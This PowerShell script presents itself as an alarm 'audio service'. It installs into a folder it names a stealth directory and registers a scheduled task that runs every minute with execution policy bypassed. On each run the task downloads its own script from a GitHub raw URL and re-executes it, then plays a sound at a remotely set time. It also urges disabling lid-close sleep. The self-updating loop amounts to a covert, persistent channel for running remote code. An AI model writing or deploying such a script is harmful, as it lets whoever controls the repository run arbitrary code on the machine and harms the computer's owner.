# Configuration
$StealthDir = "$env:USERPROFILE\.audio_service"
$LogFile = "$StealthDir\audio_service.log"
$LockFile = "$env:TEMP\audio_service_$($env:USERNAME).lock"
$TxtFile = "$StealthDir\alarm.txt"
$AudioFile = "$StealthDir\alarm.wav"
$PlayedFlag = "$StealthDir\played.flag"
$GithubBase = "https://raw.githubusercontent.com/Graf-Durka/Script/main"
$ScriptUrl = "$GithubBase/audio_service.ps1"
$TxtUrl = "$GithubBase/alarm.txt"
$AudioUrl = "$GithubBase/alarm.wav"

# Create directory and log file
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Path $StealthDir -Force | Out-Null
}
if (-not (Test-Path $LogFile)) {
    New-Item -ItemType File -Path $LogFile -Force | Out-Null
}

# Logging function
function Write-Log {
    param ([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp $Message" | Out-File -FilePath $LogFile -Append -Encoding UTF8
}

# Check lock file
function Check-Lock {
    if (Test-Path $LockFile) {
        Write-Log "❌ Service already running"
        exit 1
    }
    New-Item -ItemType File -Path $LockFile -Force | Out-Null
    trap { Remove-Item $LockFile -Force -ErrorAction SilentlyContinue; exit }
}

# Play audio function
function Play-Audio {
    Write-Log "Playing audio"
    if (-not (Test-Path $AudioFile)) {
        Write-Log "❌ Audio file $AudioFile not found"
        return 1
    }
    try {
        $player = New-Object System.Media.SoundPlayer
        $player.SoundLocation = $AudioFile
        $player.PlaySync()
        Write-Log "✅ Audio played successfully"
    } catch {
        Write-Log "❌ Failed to play audio: $_"
        return 1
    }
}

# Update file from GitHub
function Update-File {
    param ([string]$Url, [string]$LocalFile)
    $tempFile = "$env:TEMP\$(Split-Path $LocalFile -Leaf).tmp"
    try {
        Invoke-WebRequest -Uri $Url -Headers @{"Cache-Control"="no-cache"} -OutFile $tempFile -ErrorAction Stop
        if ((Test-Path $tempFile) -and ((Get-Item $tempFile).Length -gt 0)) {
            if (-not (Test-Path $LocalFile) -or (Compare-Object (Get-Content $tempFile) (Get-Content $LocalFile))) {
                Move-Item $tempFile $LocalFile -Force
                Write-Log "✅ Updated file $(Split-Path $LocalFile -Leaf)"
                return $true
            } else {
                Remove-Item $tempFile -Force
                return $false
            }
        } else {
            Write-Log "❌ Failed to download $Url or file is empty"
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            return $false
        }
    } catch {
        Write-Log "❌ Error downloading $Url : $_"
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# Update script itself
function Update-Self {
    $tempScript = "$env:TEMP\audio_service.ps1.tmp"
    try {
        Invoke-WebRequest -Uri $ScriptUrl -Headers @{"Cache-Control"="no-cache"} -OutFile $tempScript -ErrorAction Stop
        if ((Test-Path $tempScript) -and ((Get-Item $tempScript).Length -gt 0)) {
            if (Compare-Object (Get-Content $tempScript) (Get-Content "$StealthDir\audio_service.ps1")) {
                Move-Item $tempScript "$StealthDir\audio_service.ps1" -Force
                Write-Log "✅ Script updated to new version"
                & "$StealthDir\audio_service.ps1" $args  # Restart with current arguments
                exit
            } else {
                Remove-Item $tempScript -Force
                return $false
            }
        } else {
            Write-Log "❌ Failed to download new script version"
            Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
            return $false
        }
    } catch {
        Write-Log "❌ Error downloading new script: $_"
        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# Setup Task Scheduler
function Setup-Task {
    Write-Log "Setting up Task Scheduler"
    $taskName = "AudioService"
    $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($task) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$StealthDir\audio_service.ps1`" --update-and-check"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([TimeSpan]::MaxValue)
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -WakeToRun
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description "Audio Service Alarm" -RunLevel Limited -ErrorAction SilentlyContinue | Out-Null
    if ($?) {
        Write-Log "✅ Task Scheduler configured"
    } else {
        Write-Log "❌ Failed to configure Task Scheduler. Run manually: schtasks /create /tn AudioService /tr `"powershell.exe -NoProfile -ExecutionPolicy Bypass -File $StealthDir\audio_service.ps1 --update-and-check`" /sc minute /mo 1 /rl LIMITED /st 00:00"
        Write-Host "Run this command with admin rights: schtasks /create /tn AudioService /tr `"powershell.exe -NoProfile -ExecutionPolicy Bypass -File $StealthDir\audio_service.ps1 --update-and-check`" /sc minute /mo 1 /rl LIMITED /st 00:00"
    }
}

# Check lid close settings
function Setup-LidIgnore {
    $lidAction = powercfg /query SCHEME_CURRENT SUB_BUTTONS LIDOPEN | Select-String "Current AC Power Setting Index"
    if ($lidAction -notmatch "0x00000000") {
        Write-Log "⚠️ Lid close set to sleep. To prevent, run: powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDOPEN 0 && powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDOPEN 0 && powercfg /s SCHEME_CURRENT"
        Write-Host "To prevent sleep on lid close, run with admin rights: powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDOPEN 0 && powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDOPEN 0 && powercfg /s SCHEME_CURRENT"
    }
}

# Main logic
Check-Lock

switch ($args[0]) {
    "--update-and-check" {
        Update-Self
        $updatedTxt = $false
        if (Update-File $TxtUrl $TxtFile) {
            $updatedTxt = $true
        }
        Update-File $AudioUrl $AudioFile
        if ($updatedTxt) {
            Remove-Item $PlayedFlag -Force -ErrorAction SilentlyContinue
            Write-Log "Played flag reset due to txt update"
        }
        if (-not (Test-Path $TxtFile) -or -not (Test-Path $AudioFile)) {
            Write-Log "❌ Missing txt or audio file"
            exit 0
        }
        $scheduled = (Get-Content $TxtFile -Raw).Trim()
        $current = Get-Date -Format "yyyy-MM-dd HH:mm"
        $currentEpoch = [int64](Get-Date $current -UFormat %s)
        $scheduledEpoch = [int64](Get-Date $scheduled -UFormat %s -ErrorAction SilentlyContinue)
        if (-not $scheduledEpoch) {
            Write-Log "❌ Invalid time format in $TxtFile"
            exit 1
        }
        if ($currentEpoch -ge $scheduledEpoch -and ($currentEpoch - $scheduledEpoch) -le 60 -and -not (Test-Path $PlayedFlag)) {
            Play-Audio
            New-Item -ItemType File -Path $PlayedFlag -Force | Out-Null
        } elseif ($currentEpoch -gt ($scheduledEpoch + 60)) {
            Remove-Item $PlayedFlag -Force -ErrorAction SilentlyContinue
            Write-Log "Played flag reset as alarm time passed"
        }
    }
    "--play" {
        Play-Audio
    }
    "--status" {
        Write-Host "Status:"
        Write-Host "Log: $LogFile"
        Write-Host "Task Scheduler:"
        $task = Get-ScheduledTask -TaskName "AudioService" -ErrorAction SilentlyContinue
        if ($task) {
            Write-Host $task.TaskName
        } else {
            Write-Host "Not found"
        }
        Write-Host "Last logs:"
        Get-Content $LogFile -Tail 10
    }
    default {
        Write-Log "Installing service"
        Setup-LidIgnore
        if (-not (Test-Path "$StealthDir\audio_service.ps1")) {
            Invoke-WebRequest -Uri $ScriptUrl -Headers @{"Cache-Control"="no-cache"} -OutFile "$StealthDir\audio_service.ps1" -ErrorAction Stop
            Write-Log "✅ Script downloaded and installed"
        }
        Update-Self
        Update-File $TxtUrl $TxtFile
        Update-File $AudioUrl $AudioFile
        Setup-Task
        Write-Host "Installed! Check status: powershell.exe -File $StealthDir\audio_service.ps1 --status"
        exit 0  # Auto-close terminal
    }
}
